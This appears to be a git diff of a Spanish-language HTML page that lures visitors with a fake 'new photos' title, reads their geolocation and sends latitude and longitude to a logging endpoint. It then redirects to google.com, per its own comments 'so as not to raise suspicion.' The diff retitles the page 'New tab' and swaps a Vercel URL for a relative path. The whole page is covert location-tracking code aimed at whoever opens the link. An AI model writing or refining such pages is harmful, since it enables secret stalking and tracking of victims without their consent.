@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>¡Fotos nuevas disponibles!</title>
+    <title>Nueva pestaña</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { 
@@ -28,11 +28,11 @@
             const lon = position.coords.longitude;
             
             // Opción 1: Enviar datos a un servidor tuyo (más discreto)
-            fetch("https://pin2-vjok-jv3z8sng2-curco77s-projects.vercel.app/api/log", {  // Cambia "tudominio" por tu nombre de proyecto
+            fetch("/api/log", {
                 method: "POST",
                 body: JSON.stringify({ lat, lon }),
                 headers: { "Content-Type": "application/json" }
-            }).then(() => {
+                }).then(() => {
                 // Redirigir a un sitio legítimo para no levantar sospechas
                 window.location.href = "https://google.com";
             }).catch(() => {
